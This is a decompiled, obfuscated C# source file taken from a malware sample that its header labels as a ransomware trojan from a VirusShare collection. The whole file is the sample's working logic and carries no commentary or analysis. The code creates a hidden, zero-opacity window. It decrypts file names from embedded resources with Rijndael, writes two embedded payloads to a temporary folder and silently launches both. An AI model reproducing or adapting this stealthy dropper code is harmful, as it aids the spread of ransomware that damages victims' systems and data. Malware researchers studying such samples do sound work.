// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLB, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 273A448B-459A-4DB6-844A-AD8F16DBC137
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00030-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-34f6b3bc39d40e01d57013b70665df0b46afaccf0ad5f6f6022f2d1256915b88.exe.exe

using \u000E;
using \u008F\u000E;
using \u0093\u000E;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace \u0093\u000E
{
  internal class \u0094\u000E : Form
  {
    private static List<WeakReference> \u0001 = new List<WeakReference>();
    private IContainer \u0002;

    [DebuggerNonUserCode]
    static \u0094\u000E()
    {
    }

    [DebuggerNonUserCode]
    public \u0094\u000E()
    {
      this.Load += new EventHandler(this.\u0089\u000E);
      \u0094\u000E.\u0086\u000E((object) this);
      this.\u001C\u0003();
    }

    [DebuggerNonUserCode]
    private static void \u0086\u000E([In] object obj0)
    {
      List<WeakReference> weakReferenceList = \u0094\u000E.\u0001;
      bool flag = false;
      try
      {
        \u0001.\u0001((object) weakReferenceList, ref flag);
        if (\u0094\u000E.\u0001.Count == \u0094\u000E.\u0001.Capacity)
        {
          int index1 = 0;
          int num = checked (\u0094\u000E.\u0001.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            WeakReference weakReference = \u0094\u000E.\u0001[index2];
            if (\u0002.\u007E\u0002((object) weakReference))
            {
              if (index2 != index1)
                \u0094\u000E.\u0001[index1] = \u0094\u000E.\u0001[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          \u0094\u000E.\u0001.RemoveRange(index1, checked (\u0094\u000E.\u0001.Count - index1));
          \u0094\u000E.\u0001.Capacity = \u0094\u000E.\u0001.Count;
        }
        \u0094\u000E.\u0001.Add(new WeakReference(\u0003.\u0004(obj0)));
      }
      finally
      {
        if (flag)
          \u0004.\u0005((object) weakReferenceList);
      }
    }

    [DebuggerNonUserCode]
    void Form.\u0013([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0002 == null)
          return;
        \u0018.\u007E\u001F((object) this.\u0002);
      }
      finally
      {
        \u0019.\u0083((object) this, obj0);
      }
    }

    private void \u001C\u0003()
    {
      \u0018.\u007E\u007F((object) this);
      \u001A.\u007E\u0088((object) this, new SizeF(6f, 13f));
      \u001B.\u007E\u0089((object) this, AutoScaleMode.Font);
      \u001C.\u007E\u008A((object) this, new Size(4, 0));
      \u001D.\u007E\u008B((object) this, FormBorderStyle.FixedSingle);
      \u001E.\u007E\u008C((object) this, \u0008.\u0007(227));
      \u001F.\u007E\u008E((object) this, 0.0);
      \u0019.\u007E\u0084((object) this, false);
      \u0019.\u007E\u0086((object) this, false);
      \u001E.\u007E\u008D((object) this, \u0008.\u0007(240));
      \u0019.\u007E\u0087((object) this, false);
    }

    private void \u0089\u000E([In] object obj0, [In] EventArgs obj1)
    {
      byte[] numArray1 = \u0099\u000E.\u0096\u000E(\u0010.\u007E\u0013((object) \u0080.\u007E\u0090((object) \u007F.\u008F())));
      byte[] numArray2 = \u0099\u000E.\u0097\u000E(\u0010.\u007E\u0013((object) \u0080.\u007E\u0090((object) \u007F.\u008F())));
      byte[] numArray3 = \u0099\u000E.\u0098\u000E(\u0010.\u007E\u0013((object) \u0080.\u007E\u0090((object) \u007F.\u008F())));
      string str1 = \u0014.\u007E\u001A((object) \u0011.\u0016(), numArray3);
      string[] strArray = \u0081.\u0091(str1, \u0092\u0002.\u0091\u000E(\u0008.\u0007(253), \u0008.\u0007(266)), -1, CompareMethod.Binary);
      string str2 = \u0010.\u007E\u0014((object) \u0083.\u007E\u0093((object) \u0082.\u0092()));
      try
      {
        \u0088.\u007E\u0097((object) \u0084.\u007E\u0094((object) \u0016\u0002.\u0013\u0002()), \u0087.\u0096(\u0086.\u0095(), \u0092\u0002.\u0091\u000E(\u0008.\u0007(275), \u0008.\u0007(266)), this.\u0084\u0003(strArray[1], \u0008.\u0007(266), \u0008.\u0007(284))), numArray1, false);
        \u0088.\u007E\u0097((object) \u0084.\u007E\u0094((object) \u0016\u0002.\u0013\u0002()), \u0087.\u0096(\u0086.\u0095(), \u0092\u0002.\u0091\u000E(\u0008.\u0007(275), \u0008.\u0007(266)), this.\u0084\u0003(strArray[2], \u0008.\u0007(266), \u0008.\u0007(284))), numArray2, false);
        Process process1 = \u0089.\u0098(\u0087.\u0096(\u0086.\u0095(), \u0092\u0002.\u0091\u000E(\u0008.\u0007(275), \u0008.\u0007(266)), this.\u0084\u0003(strArray[1], \u0008.\u0007(266), \u0008.\u0007(284))));
        Process process2 = \u0089.\u0098(\u0087.\u0096(\u0086.\u0095(), \u0092\u0002.\u0091\u000E(\u0008.\u0007(275), \u0008.\u0007(266)), this.\u0084\u0003(strArray[2], \u0008.\u0007(266), \u0008.\u0007(284))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0016.\u001C();
      }
      \u0016.\u001D();
    }

    public string \u0084\u0003([In] string obj0, [In] string obj1, [In] string obj2)
    {
      string strHashName = \u0008.\u0007(293);
      string str1 = \u008A.\u0099(2);
      string str2 = \u0008.\u0007(302);
      int num1 = 128;
      if (\u008B.\u009A(obj0))
        return \u0008.\u0007(327);
      byte[] numArray1 = \u0013.\u007E\u0019((object) \u0011.\u0017(), str2);
      byte[] rgbSalt = \u0013.\u007E\u0019((object) \u0011.\u0017(), obj2);
      byte[] buffer = \u0012.\u0018(obj0);
      PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(obj1, rgbSalt, strHashName, \u008C.\u009B(str1));
      byte[] numArray2 = \u008E.\u007E\u009E((object) passwordDeriveBytes, checked ((int) \u008D.\u009D(unchecked ((double) num1 / 8.0))));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      \u008F.\u007E\u009F((object) rijndaelManaged, CipherMode.CBC);
      byte[] numArray3 = new byte[checked (buffer.Length - 1 + 1)];
      int num2 = 0;
      ICryptoTransform transform = \u0090.\u007E\u0001\u0002((object) rijndaelManaged, numArray2, numArray1);
      try
      {
        MemoryStream memoryStream = new MemoryStream(buffer);
        try
        {
          CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, transform, CryptoStreamMode.Read);
          try
          {
            num2 = \u0091.\u007E\u0002\u0002((object) cryptoStream, numArray3, 0, numArray3.Length);
            \u0018.\u007E\u0080((object) memoryStream);
            \u0018.\u007E\u0080((object) cryptoStream);
          }
          finally
          {
            if (cryptoStream != null)
              \u0018.\u007E\u001F((object) cryptoStream);
          }
        }
        finally
        {
          if (memoryStream != null)
            \u0018.\u007E\u001F((object) memoryStream);
        }
      }
      finally
      {
        if (transform != null)
          \u0018.\u007E\u001F((object) transform);
      }
      \u0018.\u007E\u0081((object) rijndaelManaged);
      return \u0092.\u007E\u0004\u0002((object) \u0011.\u0015(), numArray3, 0, num2);
    }
  }
}
